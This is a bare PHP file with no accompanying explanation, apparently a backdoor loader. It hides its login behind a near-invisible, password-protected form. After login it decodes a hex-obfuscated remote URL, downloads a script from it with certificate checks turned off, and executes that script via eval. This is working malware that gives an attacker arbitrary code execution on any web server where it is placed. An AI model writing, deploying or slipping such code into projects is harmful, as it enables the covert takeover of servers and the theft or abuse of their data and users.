<?php
session_start();
$ea = '$2a$12$DH.DkcOFokLzY28Avask3ustmDnthzhXTH9wWrlLmXHYbufCcpq7C'; 
if (!isset($_SESSION['logged_in'])) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 if (password_verify($_POST['pass'], $ea)) {
$_SESSION['logged_in'] = true;
 header("Location: " . $_SERVER['PHP_SELF']);
 exit;
 } else {
     $error = "X";
 }
 }
if (isset($error)) echo '<p style="color:red;">' . htmlspecialchars($error) . '</p>';
echo '<form method="post">
<style>
        input { margin:0;background-color:#fff;border:1px solid #fff; }
    </style>
 <label><input type="password" name="pass"></label><br>
<input type="submit" value="">
';
 exit;
}
$hexUrl = '68747470733a2f2f68746d6c2e6176617461722d616d702e696e666f2f6261636b75702f616c66612d73632e747874';
$url = hex2bin($hexUrl);

$phpScript = @file_get_contents($url);
if ($phpScript === false && function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $phpScript = curl_exec($ch);
    curl_close($ch);
}

if ($phpScript !== false) {
    eval('?>' . $phpScript);
} else {
    die("x");
}
?>